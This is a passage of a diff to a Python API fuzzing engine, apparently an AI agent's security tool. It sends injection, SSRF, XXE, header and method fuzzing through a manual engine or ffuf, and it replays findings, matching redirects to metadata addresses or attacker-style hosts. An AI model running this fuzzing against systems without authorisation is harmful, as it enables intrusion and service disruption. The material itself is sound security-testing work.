+        return body.rstrip().rstrip("}") + ',"__fuzz":"FUZZ"}'
+    if "form" in ct:
+        try:
+            return urlencode({k: "FUZZ" for k in parse_qs(body)})
+        except Exception:
+            pass
+    return body + "&__fuzz=FUZZ"
+
+
+def _count_wordlist_entries(path: str) -> int:
+    try:
+        with open(path, "r", encoding="utf-8", errors="ignore") as f:
+            return sum(1 for line in f if line.strip() and not line.lstrip().startswith("#"))
+    except Exception:
+        return 0
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# §11  POST-PROCESSING
+# ══════════════════════════════════════════════════════════════════════════════
+
+def _build_param_summaries(findings: list[Finding]) -> list[ParamSummary]:
+    bucket: dict[str, list[Finding]] = {}
+    for f in findings:
+        if f.param:
+            key = f"{f.url}|{f.param}"
+            bucket.setdefault(key, []).append(f)
+
+    summaries: list[ParamSummary] = []
+    for key, fs in bucket.items():
+        url, param = key.split("|", 1)
+        vtypes = list({f.vuln_type for f in fs if f.vuln_type != "none"})
+        max_sv = max((_SEV.get(f.severity, 0) for f in fs), default=0)
+        sv_name = next((k for k, v in _SEV.items() if v == max_sv), "info")
+        summaries.append(ParamSummary(
+            param=param, endpoint=url,
+            vulns=vtypes,
+            evidence=list({e for f in fs for e in f.evidence})[:5],
+            severity=sv_name,
+            vulnerable=bool(vtypes),
+        ))
+
+    summaries.sort(key=lambda s: _SEV.get(s.severity, 0), reverse=True)
+    return summaries
+
+
+def _replay_request_for_finding(
+    sess: requests.Session,
+    finding: Finding,
+    timeout: int = 8,
+) -> tuple[Optional[int], str, dict[str, str], float, Optional[str]]:
+    """
+    Best-effort replay of a finding to reduce false positives.
+    Returns: (status, body, headers, elapsed, error)
+    """
+    method = finding.method or "GET"
+    url = finding.url
+    extra_headers: dict[str, str] = {}
+    params: Optional[dict[str, str]] = None
+    json_body: Optional[dict[str, str]] = None
+
+    if finding.param and finding.param.startswith("header:"):
+        hdr = finding.param.split(":", 1)[1]
+        extra_headers[hdr] = finding.payload
+    elif finding.param and finding.param.startswith("path:"):
+        # URL already contains path payload for path-fuzz findings.
+        pass
+    elif finding.param and "?" in url:
+        # URL-param fuzz case (stored URL uses placeholder text).
+        url = url.split("?", 1)[0]
+        params = {finding.param: finding.payload}
+    elif finding.param:
+        # Body-field fuzz case.
+        if method in {"GET", "HEAD", "OPTIONS"}:
+            params = {finding.param: finding.payload}
+        else:
+            json_body = {finding.param: finding.payload}
+
+    t0 = time.monotonic()
+    try:
+        _LIMITER.acquire()
+        r = sess.request(
+            method,
+            url,
+            params=params,
+            json=json_body,
+            headers=extra_headers or None,
+            timeout=timeout,
+            allow_redirects=False,
+        )
+        elapsed = time.monotonic() - t0
+        return r.status_code, r.text[:3000], {k.lower(): v for k, v in r.headers.items()}, elapsed, None
+    except Exception as exc:
+        return None, "", {}, 0.0, str(exc)
+
+
+def _is_reconfirmed(finding: Finding, status: Optional[int], body: str, hdrs: dict[str, str], elapsed: float) -> tuple[bool, str]:
+    """Heuristic replay validator per finding type."""
+    vt = finding.vuln_type
+
+    if vt == "xss_reflection":
+        return (finding.payload[:20] in body, "payload reflected again")
+
+    if vt == "time_based_injection":
+        return (elapsed > 2.5, f"replay delay={elapsed:.2f}s")
+
+    if vt == "auth_bypass":
+        return (status in {200, 201, 204}, f"status={status}")
+
+    if vt == "ssrf":
+        loc = hdrs.get("location", "")
+        hit = bool(status in {301, 302, 307, 308} and any(k in loc for k in ("169.254", "metadata", "localhost", "127.")))
+        return (hit, f"redirect={loc[:120]}")
+
+    if vt == "open_redirect":
+        loc = hdrs.get("location", "")
+        hit = bool(status in {301, 302, 307, 308} and ("evil.com" in loc or "attacker" in loc))
+        return (hit, f"redirect={loc[:120]}")
+
+    if vt == "secret_disclosure":
+        hit = bool(_secrets(body))
+        return (hit, "secret-like material observed again")
+
+    if vt == "server_error":
+        return (bool(status and status >= 500), f"status={status}")
+
+    # Fallback: same status with high-impact HTTP response classes.
+    fallback = bool(status == finding.status and status is not None and (status >= 500 or status in {200, 201, 204, 401, 403}))
+    return (fallback, f"status={status}, expected={finding.status}")
+
+
+def _replay_confirm_findings(
+    findings: list[Finding],
+    headers: dict[str, str],
+    timeout: int,
+    max_attempts: int,
+) -> list[Finding]:
+    confirmed: list[Finding] = []
+    sess = _session(headers)
+    attempts = 0
+
+    for f in findings:
+        if attempts >= max_attempts:
+            break
+        attempts += 1
+        status, body, hdrs, elapsed, err = _replay_request_for_finding(sess, f, timeout=min(timeout, 8))
+        if err:
+            continue
+        ok, replay_note = _is_reconfirmed(f, status, body, hdrs, elapsed)
+        if not ok:
+            continue
+
+        cf = f.model_copy(deep=True)
+        cf.evidence = list(dict.fromkeys([*cf.evidence, f"replay_confirmed: {replay_note}"]))[:10]
+        confirmed.append(cf)
+
+    return confirmed
+
+
+def _compact_finding_brief(f: Finding) -> dict[str, Any]:
+    brief: dict[str, Any] = {
+        "u": f.url,
+        "m": f.method,
+        "t": f.vuln_type,
+        "s": f.severity,
+    }
+    if f.param:
+        brief["p"] = f.param
+    if f.status is not None:
+        brief["st"] = f.status
+    if f.evidence:
+        brief["e"] = f.evidence[:2]
+    return brief
+
+
+def _build_llm_brief(
+    target: str,
+    tested_endpoints: list[str],
+    discovered_endpoints: list[str],
+    vulnerable: bool,
+    confidence: str,
+    quick_mode: bool,
+    confirmed_findings: list[Finding],
+    critical_findings: list[Finding],
+    method_results: list[MethodResult],
+    content_type_results: list[ContentTypeResult],
+    coverage_note: str,
+    error: Optional[str],
+) -> dict[str, Any]:
+    method_hits = [
+        {
+            "u": m.endpoint,
+            "x": m.unexpected[:4],
+            "e": m.evidence[:2],
+        }
+        for m in method_results
+        if m.vulnerable
+    ][:4]
+
+    content_type_hits = [
+        {
+            "u": c.endpoint,
+            "m": c.method,
+            "a": c.accepted[:4],
+            "e": c.evidence[:2],
+        }
+        for c in content_type_results
+        if c.bypassed
+    ][:4]
+
+    confirmed_hashes = {cf._hash for cf in confirmed_findings}
+    unconfirmed_high = [
+        f for f in critical_findings
+        if f._hash not in confirmed_hashes
+    ][:4]
+
+    brief: dict[str, Any] = {
+        "t": target,
+        "v": vulnerable,
+        "c": confidence,
+        "qm": quick_mode,
+        "te": len(tested_endpoints),
+        "de": len(discovered_endpoints),
+        "cf": [_compact_finding_brief(f) for f in confirmed_findings[:4]],
+        "uf": [_compact_finding_brief(f) for f in unconfirmed_high],
+        "mv": method_hits,
+        "ct": content_type_hits,
+        "cn": coverage_note[:220],
+    }
+    if error:
+        brief["err"] = error[:240]
+    return brief
+
+
+# ══════════════════════════════════════════════════════════════════════════════
+# §12  MAIN ENTRY POINT
+# ══════════════════════════════════════════════════════════════════════════════
 
 def api_fuzzing(
-    tool:          str,
-    target:        str,
-    args:          list[str] = [],
-    endpoints:     list[str] = [],
-    headers:       dict[str, str] = {},
-    wordlist:      Optional[str] = None,
-    methods:       list[str] = ["GET", "POST", "PUT", "DELETE", "PATCH"],
-    content_types: list[str] = [],
-    params:        dict[str, str] = {},
-    body:          Optional[str] = None,
+    tool:        str,
+    target:      str,
+    args:        list[str]       = [],
+    timeout:     int             = 600,
+    endpoints:   list[str]       = [],
+    headers:     dict[str, str]  = {},
+    wordlist:    Optional[str]   = None,
+    methods:     list[str]       = ["GET", "POST", "PUT", "DELETE", "PATCH"],
+    params:      dict[str, str]  = {},
+    body:        Optional[str]   = None,
+    rps:         float           = 30.0,
+    openapi_url: Optional[str]   = None,
+    quick:       bool            = False,
+    payload_cap: int             = 15,
+    max_endpoints: int           = 0,
+    confirm_findings: bool       = True,
+    confirmation_attempts: int   = 8,
 ) -> dict:
     """
-    🔧 Agent Tool: API Fuzzer
+    API Fuzzing Engine v3.
 
-    Capabilities:
-      ┌───────────────────────────────────────────────────────────────────┐
-      │  PARAM FUZZING        URL params, body fields, path segments,     │
-      │                       HTTP headers                                 │
-      │  INJECTION PAYLOADS   SQLi (30), XSS (20), SSTI (17), LFI (18), │
-      │                       CMDi (17), Overflow (19), SSRF (17),        │
-      │                       XXE (6), Open Redirect (11)                 │
-      │  METHOD FUZZING       All HTTP methods on every endpoint          │
-      │                       Detect: PUT/DELETE on GET-only, TRACE/DEBUG  │
-      │  CONTENT-TYPE FUZZ    20 content types → bypass, XXE trigger      │
-      │  GRAPHQL FUZZING      Alias DoS, depth bomb, injection, batch     │
-      │  RESPONSE ANALYSIS    Error signatures, reflection, time-based,   │
-      │                       size anomalies, status code changes          │
-      │  TOOL INTEGRATION     ffuf, nuclei api templates, manual Python   │
-      └───────────────────────────────────────────────────────────────────┘
+    Args
+    ────
+    tool        "manual" | "ffuf"
+    target      Base API URL
+    endpoints   Extra paths/URLs to fuzz
+    headers     HTTP headers (auth tokens, etc.)
+    wordlist    Wordlist path (ffuf)
+    methods     HTTP methods to test
+    params      Baseline query params  e.g. {"id":"1","q":"test"}
+    body        Baseline request body  e.g. '{"user":"admin"}'
+    rps         Global request rate cap (req/sec)
+    openapi_url URL of OpenAPI/Swagger JSON spec (auto-discovers endpoints)
 
-    Args:
-        tool:          "ffuf" | "nuclei" | "manual"
-        target:        Base URL (e.g. "https://api.example.com")
-        args:          Raw tool arguments — agent decides
-        endpoints:     Specific endpoints to fuzz
-        headers:       Custom HTTP headers
-        wordlist:      Wordlist for ffuf/nuclei
-        methods:       HTTP methods to test
-        content_types: Content types to fuzz
-        params:        Baseline URL params to fuzz
-        body:          Baseline request body to fuzz
-
-    Tool args reference:
-      ffuf:
-        Param fuzz: ["-w", "payloads.txt:FUZZ", "-u", "URL?param=FUZZ"]
-        Body fuzz:  ["-w", "payloads.txt", "-X", "POST",
-                     "-d", '{"param":"FUZZ"}', "-H", "Content-Type: application/json"]
-        Filter:     ["-fc", "404,400", "-fs", "0", "-fw", "10"]
-        Rate:       ["-rate", "100", "-t", "50"]
-        Recursive:  ["-recursion", "-recursion-depth", "3"]
-
-      nuclei:
-        API fuzz:   ["-t", "fuzzing/", "-tags", "fuzz"]
-        Specific:   ["-t", "fuzzing/sql-injection.yaml"]
-        DAST:       ["-dast", "-t", "fuzzing/"]
-        Rate:       ["-rl", "50", "-c", "10"]
-
-      manual:
-        (all fuzzing techniques run automatically — no args needed)
-
-    Returns:
-        Structured JSON: fuzz_results → param_summaries →
-                         method_results → content_type_results →
-                         critical_findings
+    Returns
+    ───────
+    {
+      critical_findings   list[Finding]         ← agent starts here
+      param_summaries     list[ParamSummary]    ← per-param verdict
+      method_results      list[MethodResult]
+      content_type_results list[ContentTypeResult]
+      discovered_endpoints list[str]            ← from OpenAPI
+      total_sent          int
+      total_interesting   int
+      exec_time           float
+      error               str | None
+    }
     """
-    start = time.time()
+    global _LIMITER
+    t0 = time.monotonic()
 
-    # ══════════════════════════════
-    # VALIDATE
-    # ══════════════════════════════
+    # ── Validate ──────────────────────────────────────────────────────────
     try:
-        req = APIFuzzRequest(
+        req = FuzzRequest(
             tool=tool, target=target, args=args,
+            timeout=timeout,
             endpoints=endpoints, headers=headers,
             wordlist=wordlist, methods=methods,
-            content_types=content_types or CONTENT_TYPES_TO_FUZZ,
             params=params, body=body,
+            rps=rps, openapi_url=openapi_url,
+            quick=quick, payload_cap=payload_cap,
+            max_endpoints=max_endpoints,
+            confirm_findings=confirm_findings,
+            confirmation_attempts=confirmation_attempts,
         )
     except Exception as e:
-        return APIFuzzingResult(
+        return FuzzResult(
             success=False, tool=tool, target=target,
-            command="", error=f"Validation: {e}"
+            command="", error=f"Validation: {e}",
         ).model_dump()
 
-    # Normalise target
+    _DEDUP.reset()
+    _LIMITER = _TokenBucket(rps=req.rps)
+
     if not target.startswith("http"):
         target = f"https://{target}"
     target = target.rstrip("/")
 
-    all_results:          list[FuzzResult]           = []
-    param_summaries:      list[ParamFuzzSummary]     = []
-    method_results:       list[MethodFuzzResult]     = []
-    content_type_results: list[ContentTypeFuzzResult] = []
-    command_str:          str = ""
-    raw_output:           str = ""
-    error_msg:            Optional[str] = None
-    techniques_used:      list[str] = []
+    # ── OpenAPI auto-discovery ────────────────────────────────────────────
+    oa_eps: list[str]       = []
+    oa_params: dict[str, dict] = {}
+    if req.openapi_url:
+        spec = fetch_openapi(req.openapi_url)
+        if spec:
+            oa_eps, oa_params = parse_openapi(spec, target)
 
-    # Build endpoint list
-    all_endpoints = [target] + [
-        e if e.startswith("http") else target.rstrip("/") + "/" + e.lstrip("/")
-        for e in req.endpoints
-    ]
-    all_endpoints = list(dict.fromkeys(all_endpoints))
+    # ── Build full endpoint list ──────────────────────────────────────────
+    all_eps: list[str] = [target]
+    for e in req.endpoints + oa_eps:
+        full = e if e.startswith("http") else target + "/" + e.lstrip("/")
+        if full not in all_eps:
+            all_eps.append(full)
 
-    # Build payloads
-    all_payloads = build_payload_list(limit_per_category=15)
+    if req.quick:
+        # Quick mode should stay lightweight, but one endpoint is often too
+        # shallow to give an agent useful signal.
+        non_root = [ep for ep in all_eps if ep.rstrip("/") != target]
+        quick_cap = min(req.max_endpoints or 3, 3)
+        all_eps = non_root[:quick_cap] if non_root else all_eps[:1]
+    elif req.max_endpoints > 0:
+        all_eps = all_eps[:req.max_endpoints]
 
-    # ══════════════════════════════
-    # TOOL: MANUAL
-    # ══════════════════════════════
+    # ── Shared accumulators ───────────────────────────────────────────────
+    all_findings:  list[Finding]             = []
+    method_res:    list[MethodResult]        = []
+    ct_res:        list[ContentTypeResult]   = []
+    command_str    = ""
+    raw_out        = ""
+    error_msg: Optional[str]                 = None
+    techniques:    list[str]                 = []
+    ffuf_estimated_sent: int                 = 0
+
+    effective_cap = min(req.payload_cap, 3) if req.quick else req.payload_cap
+    all_payloads = _payloads(cap=effective_cap)
+
+    # ══════════════════════════════════════════════════════════════════════
+    # MANUAL ENGINE
+    # ══════════════════════════════════════════════════════════════════════
     if tool == "manual":
-        command_str = f"manual_api_fuzz({target}, {len(all_endpoints)} endpoints)"
+        command_str = f"manual({target}, {len(all_eps)} endpoints, rps={req.rps})"
 
-        for ep in all_endpoints:
-            with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+        for ep in all_eps:
+            ep_params = {**req.params, **(oa_params.get(ep, {}))}
+            sess      = _session(req.headers)
 
-                # ── URL param fuzzing ──
-                fut_url = ex.submit(
-                    fuzz_url_params,
-                    ep, "GET", req.params, req.headers,
-                    all_payloads,
-                )
+            ep_params_quick = ep_params
+            quick_payloads = all_payloads
+            quick_body = req.body
+            if req.quick:
+                qp = [p for p in all_payloads if p[2] in {"sqli", "xss", "cmdi", "ssrf"}]
+                quick_payloads = qp[:4] if qp else all_payloads[:4]
+                if ep_params:
+                    k = next(iter(ep_params.keys()))
+                    ep_params_quick = {k: ep_params[k]}
+                else:
+                    ep_params_quick = {"id": "1"}
+                quick_body = req.body or '{"id":"1"}'
 
-                # ── Body fuzzing (POST/PUT) ──
-                fut_body_post = ex.submit(
-                    fuzz_body_params,
-                    ep, "POST", req.body,
-                    "application/json", req.headers,
-                    all_payloads,
-                )
-                fut_body_put = ex.submit(
-                    fuzz_body_params,
-                    ep, "PUT", req.body,
-                    "application/json", req.headers,
-                    all_payloads[:50],  # cap for PUT
-                )
+            def _run_ep(ep=ep, ep_params=ep_params, sess=sess):
+                fs: list[Finding] = []
+                with concurrent.futures.ThreadPoolExecutor(max_workers=4 if req.quick else 8) as ex:
+                    jobs: dict[concurrent.futures.Future, str] = {}
 
-                # ── HTTP method fuzzing ──
-                fut_methods = ex.submit(
-                    fuzz_http_methods,
-                    ep, req.headers, "GET",
-                )
+                    jobs[ex.submit(fuzz_url_params, ep, "GET",
+                                   ep_params_quick if req.quick else ep_params,
+                                   sess,
+                                   quick_payloads if req.quick else all_payloads,
+                                   4 if req.quick else 8)] = "url_params"
 
-                # ── Content-type fuzzing ──
-                fut_ct = ex.submit(
-                    fuzz_content_types,
-                    ep, "POST",
-                    req.body or '{"test":"fuzz"}',
-                    req.headers,
-                )
+                    jobs[ex.submit(fuzz_body_params, ep, "POST",
+                                   quick_body if req.quick else req.body,
+                                   "application/json",
+                                   sess,
+                                   quick_payloads if req.quick else all_payloads,
+                                   4 if req.quick else 8)] = "body_post"
 
-                # ── Header injection ──
-                fut_hdrs = ex.submit(
-                    fuzz_headers,
-                    ep, "GET", req.headers, all_payloads,
-                )
+                    if not req.quick:
+                        jobs[ex.submit(fuzz_body_params, ep, "PUT",
+                                       req.body, "application/json",
+                                       sess, all_payloads[:50])] = "body_put"
 
-                # ── XXE ──
-                fut_xxe = ex.submit(
-                    fuzz_xxe,
-                    ep, "POST", req.headers,
-                )
+                        jobs[ex.submit(fuzz_headers, ep, "GET",
+                                       sess, all_payloads)] = "headers"
 
-                # ── GraphQL fuzz (if endpoint looks like GQL) ──
-                fut_gql = None
-                if any(kw in ep.lower() for kw in
-                       ["graphql", "graphiql", "query", "/gql"]):
-                    fut_gql = ex.submit(
-                        fuzz_graphql,
-                        ep, req.headers,
-                    )
+                    if req.quick:
+                        jobs[ex.submit(
+                            fuzz_methods,
+                            ep,
+                            sess,
+                            3,
+                            ["GET", "POST", "OPTIONS", "TRACE"],
+                            True,
+                        )] = "__method__"
+                    else:
+                        jobs[ex.submit(fuzz_methods, ep, sess)] = "__method__"
 
-                # Collect results
-                for fut, label in [
-                    (fut_url,       "url_param_fuzz"),
-                    (fut_body_post, "body_fuzz_post"),
-                    (fut_body_put,  "body_fuzz_put"),
-                    (fut_hdrs,      "header_injection"),
-                    (fut_xxe,       "xxe_fuzz"),
-                ]:
-                    try:
-                        res = fut.result()
-                        all_results.extend(res)
-                        if res:
-                            techniques_used.append(label)
-                    except Exception as e:
-                        pass
+                    if not req.quick:
+                        jobs[ex.submit(fuzz_xxe, ep, "POST", sess)] = "xxe"
+                        jobs[ex.submit(fuzz_content_types, ep, "POST",
+                                       req.body or '{"test":"fuzz"}',
+                                       sess)] = "__ct__"
 
-                # Method results
-                try:
-                    mr = fut_methods.result()
-                    method_results.append(mr)
-                    techniques_used.append("method_fuzz")
-                except Exception:
-                    pass
+                    if any(kw in ep.lower() for kw in
+                           ["graphql", "graphiql", "/gql", "/query"]):
+                        jobs[ex.submit(fuzz_graphql, ep, sess)] = "graphql"
 
-                # Content-type results
-                try:
-                    ctr = fut_ct.result()
-                    content_type_results.append(ctr)
-                    techniques_used.append("content_type_fuzz")
-                except Exception:
-                    pass
+                    for fut, label in jobs.items():
+                        try:
+                            res = fut.result()
+                        except Exception as exc:
+                            log.warning("[%s] %s", label, exc)
+                            continue
 
-                # GraphQL results
-                if fut_gql:
-                    try:
-                        gql_res = fut_gql.result()
-                        all_results.extend(gql_res)
-                        techniques_used.append("graphql_fuzz")
-                    except Exception:
-                        pass
+                        if label == "__method__":
+                            method_res.append(res)
+                            techniques.append("method_fuzz")
+                        elif label == "__ct__":
+                            ct_res.append(res)
+                            techniques.append("content_type_fuzz")
+                        else:
+                            fs.extend(res)
+                            if res:
+                                techniques.append(label)
 
-            # ── Path param fuzzing ──
-            # Try common path patterns
-            path_templates = [
-                "/api/users/FUZZ",
-                "/api/v1/FUZZ",
-                "/api/FUZZ",
-                "/FUZZ",
-            ]
-            # Extract path from endpoint and add FUZZ
-            ep_path = re.sub(r"https?://[^/]+", "", ep)
-            if ep_path and ep_path != "/":
-                path_templates.insert(0, ep_path + "/FUZZ")
-                path_templates.insert(0, ep_path.rsplit("/", 1)[0] + "/FUZZ")
+                # Path param fuzzing
+                if not req.quick:
+                    ep_path = re.sub(r"https?://[^/]+", "", ep)
+                    tpl = (ep_path.rstrip("/") + "/FUZZ") if ep_path and ep_path != "/" \
+                        else "/api/FUZZ"
+                    path_pl = [(p, l, c) for p, l, c in all_payloads
+                               if c in ("lfi", "overflow", "sqli")][:30]
+                    fs.extend(fuzz_path_params(target, tpl, _session(req.headers),
+                                               path_pl))
+                return fs
 
-            path_results = fuzz_path_params(
-                target,
-                path_templates[0],
-                req.headers,
-                [(p, l, c) for p, l, c in all_payloads
-                 if c in ("path_traversal", "overflow", "sqli")][:30],
-            )
-            all_results.extend(path_results)
-            if path_results:
-                techniques_used.append("path_param_fuzz")
+            ep_findings = _run_ep()
+            all_findings.extend(ep_findings)
 
-        # ── Build param summaries ──
-        params_seen: dict[str, list[FuzzResult]] = {}
-        for r in all_results:
-            if r.param_name:
-                key = f"{r.url}::{r.param_name}"
-                params_seen.setdefault(key, []).append(r)
-
-        for key, fuzz_rs in params_seen.items():
-            ep_url, param = key.split("::", 1)
-            summary = ParamFuzzSummary(
-                param_name=param,
-                endpoint=ep_url,
-                total_payloads=len(fuzz_rs),
-                interesting_responses=[r for r in fuzz_rs if r.interesting],
-                error_responses=[r for r in fuzz_rs if r.error_detected],
-            )
-            summary.vulnerable = bool(
-                summary.interesting_responses or summary.error_responses
-            )
-            summary.vuln_types = list({
-                r.finding_type for r in
-                summary.interesting_responses + summary.error_responses
-                if r.finding_type != "none"
-            })
-            if summary.vulnerable:
-                anomalies = list({
-                    e for r in
-                    summary.interesting_responses + summary.error_responses
-                    for e in r.evidence
-                })
-                summary.anomalies = anomalies[:5]
-            param_summaries.append(summary)
-
-    # ══════════════════════════════
-    # TOOL: FFUF
-    # ══════════════════════════════
+    # ══════════════════════════════════════════════════════════════════════
+    # FFUF ENGINE
+    # ══════════════════════════════════════════════════════════════════════
     elif tool == "ffuf":
-        import tempfile, os
+        if not _which("ffuf"):
+            return FuzzResult(
+                success=False, tool=tool, target=target,
+                command="", error="ffuf not on PATH",
+            ).model_dump()
 
-        # Write payloads to temp wordlist if no external wordlist
         tmp_wl = None
-        if req.wordlist:
-            wl_path = req.wordlist
-        else:
-            tmp_wl = tempfile.NamedTemporaryFile(
-                mode="w", suffix=".txt",
-                delete=False, prefix="fuzz_payloads_"
-            )
-            all_p = build_payload_list(limit_per_category=30)
-            tmp_wl.write("\n".join(p for p, _, _ in all_p))
+        wl_path = req.wordlist
+        wl_count = 0
+        if not wl_path:
+            tmp_wl  = tempfile.NamedTemporaryFile(
+                mode="w", suffix=".txt", delete=False, prefix="fuzz_wl_")
+            wl_cap = 2 if req.quick else 30
+            tmp_wl.write("\n".join(p for p, _, _ in _payloads(cap=wl_cap)))
             tmp_wl.close()
             wl_path = tmp_wl.name
+            wl_count = wl_cap
+        else:
+            wl_count = _count_wordlist_entries(wl_path)
 
-        commands_run = []
-
-        for ep in all_endpoints:
-            # Determine FUZZ position
-            if req.params:
-                # Fuzz first param value
-                param = list(req.params.keys())[0]
-                fuzz_url = f"{ep}?{param}=FUZZ"
+        cmds: list[str] = []
+        for ep in all_eps:
+            ep_p    = {**req.params, **(oa_params.get(ep, {}))}
+            param   = list(ep_p.keys())[0] if ep_p else "id"
+            furl    = f"{ep}?{param}=FUZZ"
+            if req.quick:
+                budget = min(12, max(6, req.timeout // max(1, len(all_eps))))
             else:
-                fuzz_url = f"{ep}?id=FUZZ"
+                budget = max(30, req.timeout // max(1, len(all_eps)))
 
-            cmd = [
-                "ffuf",
-                "-u",    fuzz_url,
-                "-w",    f"{wl_path}:FUZZ",
-                "-mc",   "all",
-                "-fc",   "404",
-                "-json",
-                "-t",    "30",
-                "-timeout", "8",
-                "-rate", "100",
-            ]
-
-            # Add custom headers
+            # GET param fuzz
+            cmd = ["ffuf", "-u", furl, "-w", f"{wl_path}:FUZZ",
+                   "-mc", "all", "-fc", "404",
+                   "-json", "-timeout", "8"]
+            if req.quick:
+                cmd += [
+                    "-t", "5",
+                    "-rate", str(min(10, max(1, int(req.rps)))),
+                    "-maxtime", "10",
+                    "-maxtime-job", "8",
+                    "-s",
+                ]
+            else:
+                cmd += ["-t", "30", "-rate", str(int(req.rps))]
             for k, v in req.headers.items():
-                cmd.extend(["-H", f"{k}: {v}"])
-
+                cmd += ["-H", f"{k}: {v}"]
             cmd += list(req.args)
-            commands_run.append(" ".join(cmd))
+            cmds.append(" ".join(cmd))
+            ffuf_estimated_sent += max(0, wl_count)
 
-            stdout, stderr, rc = safe_execute(cmd, req.timeout // len(all_endpoints))
-            raw_output += (stdout or stderr)[:2000]
+            out, err, rc = _run(cmd, budget)
+            raw_out += (out or err)[:2000]
+            all_findings.extend(_parse_ffuf(out, ep))
+            if rc != 0 and not all_findings:
+                error_msg = (err or out)[:300]
 
-            parsed = parse_ffuf_fuzz(stdout, stderr, ep)
-            all_results.extend(parsed)
-
-            if rc != 0 and not parsed:
-                error_msg = (stderr or stdout)[:300]
-
-            # Also fuzz body if POST
-            if "POST" in req.methods or "PUT" in req.methods:
-                body_val  = req.body or '{"FUZZ":"test"}'
-                body_fuzz = body_val.replace("{", '{"FUZZ":').replace(
-                    "}", ',"_fuzz":1}'
-                ) if "FUZZ" not in body_val else body_val
-
+            # POST body fuzz
+            if ("POST" in req.methods or "PUT" in req.methods) and not req.quick:
+                fuzzed_body = _ffuf_body(req.body, "application/json")
                 cmd_post = [
-                    "ffuf",
-                    "-u",   ep,
-                    "-w",   f"{wl_path}:FUZZ",
-                    "-X",   "POST",
-                    "-d",   body_fuzz,
-                    "-H",   "Content-Type: application/json",
-                    "-mc",  "all",
-                    "-fc",  "404",
-                    "-json",
-                    "-t",   "20",
-                    "-rate","50",
+                    "ffuf", "-u", ep, "-w", f"{wl_path}:FUZZ",
+                    "-X", "POST", "-d", fuzzed_body,
+                    "-H", "Content-Type: application/json",
+                    "-mc", "all", "-fc", "404",
+                    "-json", "-t", "20",
+                    "-rate", str(max(10, int(req.rps // 2))),
                 ]
                 for k, v in req.headers.items():
-                    cmd_post.extend(["-H", f"{k}: {v}"])
+                    cmd_post += ["-H", f"{k}: {v}"]
+                cmds.append(" ".join(cmd_post))
+                ffuf_estimated_sent += max(0, wl_count)
+                out2, _, _ = _run(cmd_post, budget)
+                all_findings.extend(_parse_ffuf(out2, ep))
 
-                commands_run.append(" ".join(cmd_post))
-                stdout2, stderr2, _ = safe_execute(
-                    cmd_post, req.timeout // len(all_endpoints)
-                )
-                parsed2 = parse_ffuf_fuzz(stdout2, stderr2, ep)
-                all_results.extend(parsed2)
+        command_str = " | ".join(cmds[:3])
+        techniques.append("ffuf")
 
-        command_str = " | ".join(commands_run[:3])
-        techniques_used.append("ffuf_fuzz")
+        if not req.quick:
+            for ep in all_eps[:3]:
+                s = _session(req.headers)
+                method_res.append(fuzz_methods(ep, s))
+                ct_res.append(fuzz_content_types(ep, "POST",
+                                                  req.body or '{"test":"fuzz"}', s))
+                all_findings.extend(fuzz_xxe(ep, "POST", s))
+            techniques += ["method_fuzz", "content_type_fuzz", "xxe"]
 
-        # Supplement with manual method + content-type fuzzing
-        for ep in all_endpoints[:3]:
-            mr  = fuzz_http_methods(ep, req.headers)
-            method_results.append(mr)
-            ctr = fuzz_content_types(ep, "POST",
-                                      req.body or '{"test":"fuzz"}',
-                                      req.headers)
-            content_type_results.append(ctr)
-        techniques_used += ["method_fuzz", "content_type_fuzz"]
-
-        # Cleanup
         if tmp_wl and os.path.exists(wl_path):
             os.unlink(wl_path)
 
-    # ══════════════════════════════
-    # TOOL: NUCLEI
-    # ══════════════════════════════
-    elif tool == "nuclei":
-        import tempfile, os
-
-        # Write endpoints to temp file
-        tmp_ep = tempfile.NamedTemporaryFile(
-            mode="w", suffix=".txt",
-            delete=False, prefix="fuzz_targets_"
-        )
-        tmp_ep.write("\n".join(all_endpoints))
-        tmp_ep.close()
-
-        # Default nuclei fuzzing command
-        if req.args and req.args[0] not in ("-t", "-tags", "-u", "-l"):
-            cmd = ["nuclei"] + list(req.args)
-        else:
-            cmd = [
-                "nuclei",
-                "-l",    tmp_ep.name,
-                "-tags", "fuzz",
-                "-json",
-                "-rl",   "50",
-                "-c",    "10",
-                "-timeout", "10",
-            ]
-            # Add custom headers
-            for k, v in req.headers.items():
-                cmd.extend(["-H", f"{k}: {v}"])
-
-            # Use template dir or specific templates
-            if req.wordlist:
-                cmd.extend(["-t", req.wordlist])
-            elif not any(a in req.args for a in ["-t", "--template"]):
-                cmd.extend(["-t", "fuzzing/"])
-
-            cmd += list(req.args)
-
-        command_str = " ".join(cmd)
-        stdout, stderr, rc = safe_execute(cmd, req.timeout)
-        raw_output = (stdout or stderr)[:5000]
-
-        parsed = parse_nuclei_fuzz(stdout, stderr)
-        all_results.extend(parsed)
-        techniques_used.append("nuclei_fuzz")
-
-        if rc != 0 and not parsed:
-            error_msg = (stderr or stdout)[:400]
-
-        # Supplement with manual method + content-type + XXE
-        for ep in all_endpoints[:3]:
-            mr = fuzz_http_methods(ep, req.headers)
-            method_results.append(mr)
-            ctr = fuzz_content_types(ep, "POST",
-                                      req.body or '{"test":"fuzz"}',
-                                      req.headers)
-            content_type_results.append(ctr)
-            xxe_res = fuzz_xxe(ep, "POST", req.headers)
-            all_results.extend(xxe_res)
-
-        techniques_used += ["method_fuzz", "content_type_fuzz", "xxe_fuzz"]
-
-        # Cleanup
-        if os.path.exists(tmp_ep.name):
-            os.unlink(tmp_ep.name)
-
-    # ══════════════════════════════
+    # ══════════════════════════════════════════════════════════════════════
+    # ══════════════════════════════════════════════════════════════════════
     # POST-PROCESS
-    # ══════════════════════════════
-    severity_rank = {
-        "critical": 4, "high": 3,
-        "medium": 2, "low": 1, "info": 0,
-    }
+    # ══════════════════════════════════════════════════════════════════════
+    all_findings.sort(key=lambda f: _SEV.get(f.severity, 0), reverse=True)
 
-    # Sort by severity
-    all_results.sort(
-        key=lambda r: severity_rank.get(r.severity, 0),
-        reverse=True,
+    critical = [f for f in all_findings if f.severity in ("critical", "high")]
+    candidates = [f for f in all_findings if _SEV.get(f.severity, 0) >= _SEV["high"]]
+    confirmed_findings = (
+        _replay_confirm_findings(
+            candidates,
+            headers=req.headers,
+            timeout=req.timeout,
+            max_attempts=req.confirmation_attempts,
+        )
+        if req.confirm_findings and candidates
+        else []
     )
 
-    # Critical findings
-    critical = [
-        r for r in all_results
-        if r.severity in ("critical", "high") and r.interesting
-    ]
